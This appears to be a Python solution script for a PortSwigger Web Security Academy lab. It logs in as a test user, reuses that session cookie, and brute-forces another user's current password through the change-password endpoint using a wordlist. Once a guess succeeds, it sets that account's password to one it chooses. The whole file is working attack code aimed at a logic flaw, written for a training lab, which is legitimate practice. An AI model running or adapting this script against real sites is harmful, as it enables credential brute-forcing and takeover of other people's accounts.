import requests

login_url = 'https://0a8b009403519d198165d9f400af00a8.web-security-academy.net/login'

lab_url = 'https://0a8b009403519d198165d9f400af00a8.web-security-academy.net/my-account/change-password'


def readFile(fileName):
    with open(fileName, "r", encoding="utf-8") as file:
        return file.read().splitlines()

passwords = readFile("passwords.txt")

#current-password=peter&new-password-1=peter&new-password-2=peter

def getWienerSessionToken():
    data = {
        'username': 'wiener',
        'password': 'peter'
    }
    response = requests.post(url=login_url, data=data, allow_redirects=False)
    session = response.cookies.get('session')
    print(session)
    return session

for password in passwords:
    data = {
        'username': 'carlos',
        'current-password': password,
        'new-password-1': 'test123',
        'new-password-2': 'test123'
    }

    cookies = {'session': getWienerSessionToken()}
    response = requests.post(url=lab_url, data=data, cookies=cookies)
    print(response.status_code)
    if 'Password changed successfully!' in response.text:
        print('Password changed sucessfully!')
        break

